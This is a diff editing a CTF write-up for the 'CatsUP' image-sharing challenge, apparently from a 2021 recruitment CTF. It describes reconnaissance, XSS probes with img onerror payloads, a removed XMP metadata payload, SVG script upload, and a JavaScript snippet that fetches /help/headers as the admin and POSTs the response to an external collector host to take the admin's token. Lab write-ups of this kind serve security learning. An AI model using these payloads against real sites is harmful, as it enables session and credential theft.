@@ -27,22 +27,28 @@
 
 <h4><i>Intro/Thought process</i></h4>
 
-<p>Reading the description and the name of the challenge "CatsUP" - first thought that came through my mind is that this challenge will be about some sort of XSS vulnerability. The reason is that from my previous experiences on CTFs usually title that includes "Cats" are about XSS.(I am quite sure that nearly every CTF player or security person knows this duuh!). Of course that doesn't mean that I am straight away right that this will be about XSS only.</p>
-<p>Anyway, the plan is to do some enumeration and hope that I will find some weird behaviour.</p>
+<p>After reading the description and the name of the challenge - "CatsUP" - the first thought that came through my mind is that this challenge will involve some sort of XSS vulnerability. The reason is that, from my previous experience with CTFs, usually titles that includes "cats" are about XSS (I am quite sure that nearly every CTF player or security practitioner knows this duuh!). Of course that doesn't mean that I am straight away right that this will be only about XSS.</p>
+<p>Anyway, the plan was to do some reconnaissance and hope that I will find some weird behaviour.</p>
 
 <h4><i>Finding of Initial Vector</i></h4>
 
 <p>Upon entering the site, I see that I can:</p>
 
 <ul>
-	<li>Upload an image with name through input</li>
-	<li>Browse a random image</li>
-	<li>Download image</li>
-	<li>Report image (that I've uploaded or randomly browsed) and send it to the admin</li>
+	<li>Upload an image file with a separate input field to specify a name</li>
+	<li>View a random image</li>
+	<li>Download an image</li>
+	<li>
+<ol>Report an image (that I've uploaded or randomly viewed) by selecting one of options three options:
+<li>This is not a cat</li>
+<li>Bad image quality</li>
+<li>Cat is not beautiful enough</li>
+ </ol>
+</li>
 </ul>
 
-<p>As I could see there is a lot of space to test for unexpected behaviour. Before I started playing with the name input field for the image upload, I wanted to check for disallowed paths through <code>robots.txt</code> file if it exists, this is just my usual tendency to start with on WebSec challenges... </p>
-<p>It seems we had something there: </p>
+<p>As I could see there is a lot of space to test for unexpected behaviour. Before I started playing with the name input field for the image upload, I wanted to check for disallowed paths through <code>robots.txt</code> file if it exists, this is just my usual way to start with on WebSec challenges.</p>
+<p>It seems something was there: </p>
 
 <pre>
 	User-agent: * 
@@ -51,16 +57,16 @@
 </pre>
 
 
-<p>I tried to access <b><i>/help/headers</i></b> and I got some headers for the current user that is visiting an application, which was kinda weird. </p>
+<p>I tried to access <b><i>/help/headers</i></b> and headers echoed back, which was kinda weird. </p>
 
 <img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/httpheaders.png"/>
 
 
-<p>As well I tried accessing <b><i>/i/</i></b> but I only got 404.</p>
+<p>I tried accessing <b><i>/i/</i></b> as well, but I only got 404.</p>
 
-<p>At this point I've decided to play with that input field with black box approach.<br></br> 
-I provided printable ascii from Python's <code>string</code> library.
-<br></br>
+<p>At this point I've decided to play with that input field with black box approach.
+I provided printable ASCII from Python's <code>string</code> library.
+
 And uploaded my test image file which resulted into this:
 </p>
 
@@ -87,9 +93,9 @@ And uploaded my test image file which resulted into this:
 </div>
 ```
 
-<p>Characters that are being escaped are <code>'"<></code> of course there was 80 char limit on that input so last 20 characters got ignored.
+<p>Characters that are being escaped are <code>'"<></code>. There was 80 character limit on that input so the last 20 characters got ignored.
 So this was sanitized and there was nothing for me to do here in terms of input. 
-Next I wanted to see how is this being sent to the server, I've intercepted upload request with Burp and checked the headers: 
+Next I wanted to see how is this being sent to the server. I've intercepted upload request with Burp and checked the headers: 
 </p>
 
 <pre>
@@ -125,28 +131,15 @@ Content-Type: image/jpeg
  <textarea name='file"; filename="test.<img src=xx onerror=alert(1)>'>
 ```
 
-<p>No luck there, this is also sanitized: </p>
+<p>No luck there, the browser escaped this, but it wasn't unexpected. It was just a wrongly conducted test on my side: </p>
 
 ```html
 Content-Disposition: form-data; name="file%22; filename=%22test.<img src=xx onerror=alert(1)>"
 ```
 <p>
-At this point I was tapping in place for a while. After some time passed I've decided to look up other features of the app. Browsed a random image of a cat and downloaded it(through save image as). Exiftoold the image to see if there is anything interesting there. But there was no interesting metadata in the image itself. Got an idea of trying to sneak JavaScript again through some exif metadata like Artist/Creator. And that was unfortunately sanitized as well: </p>
+At this point I was tapping in place for a while. After some time passed I've decided to look up other features of the app. Browsed a random image of a cat and downloaded it (through save image as). I exiftooled the image to see if there is anything interesting there. But there was no interesting metadata in the image itself. I've explored the possibility of injecting JavaScript through exif metadata like Artist/Creator, in case that uploaded image would be served as <code>text/html</code>. Unfortunately that wasn't the case, the image was being served as <code>text/plain</code> so this type of attack was not going to be successful. </p>
 
 
-```xml
-<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
- <rdf:Description rdf:about=''
-  xmlns:dc='http://purl.org/dc/elements/1.1/'>
-  <dc:creator>
-   <rdf:Seq>
-    <rdf:li>&quot;&gt;&lt;img src=z onerror=alert(1)&gt;</rdf:li>
-   </rdf:Seq>
-  </dc:creator>
- </rdf:Description>
-</rdf:RDF>
-</x:xmpmeta>
-```
 
 <p>But then I realized that it accepts SVG as well, so question that came up is:<br></br>- Why didn't I try uploading SVG that contains JavaScript in the first place???<br></br>I converted my test.jpeg into test.svg, added a simple script with <code>alert("Boom")</code> inside of SVG and uploaded it.<br></br></p>
 
@@ -185,33 +178,30 @@ Well it was quite fishy that below the uploaded image they had a "Download Origi
 
 
 
-<p>Report is done now just need to check captured request, there was my session which is the first flag: </p>
+<p>Image is reported, and now I just need to check the captured request. And there was my session which is the first flag: </p>
 
 <img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_first_flag.png?raw=true"/>
 
 <b>#1 FLAG: HL{catss_v3ct0r_d3t3cted!}</b>
 
 
-<p>After I got my session I had to find a token that was not in the cookie. I connected the dots quite fast because of that robot.txt at the start,all what I had to do was to modify my script a little bit in a way that will cause the reflect XSS. So it is actually quite simple, admin is logged in with token and session, we know that <b><i>/help/headers</i></b> was giving info about user who is making request in that case it was me, now we just need to make GET request to that path in the context of an admin and exfiltrate data. 
+<p>After I got my session I had to find a token that was not in the cookie. I connected the dots quite fast because of that robot.txt at the start, and all what I had to do was to modify my script a little bit in a way that will cause the reflect XSS. So it is actually quite simple: admin is logged in with a token and session and I know that <b><i>/help/headers</i></b> was reflecting request headers. Therefore I just need to make a GET request to that path in the context of an admin and exfiltrate the data. 
 <br></br>Here is my modified script:</p>
 
 ```javascript
 (async function(){
    let url = "http://localhost/help/headers";
-   let h = await fetch(url);
-   let t = await h.text();
+   let resp = await fetch(url);
+   let b = await resp.text();
    let data = await fetch("https://62e48ff7-bed8-46ee-91d5-b51fff6486cf.idocker.vuln.land/debug",{
         method:"POST",
-        body: t
+        body: b
    })
 })()
 ```
 
-<p>Checked the captured request and I got my token/second flag: </p>
+<p>I've checked the captured request and I as expected I've got my token/second flag: </p>
 
 <img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_second_flag.png" />
 
 <b>#2 FLAG: <i>HL{r3fl3cted_c4t_p1ck1ng}</i></b>
-
-
-
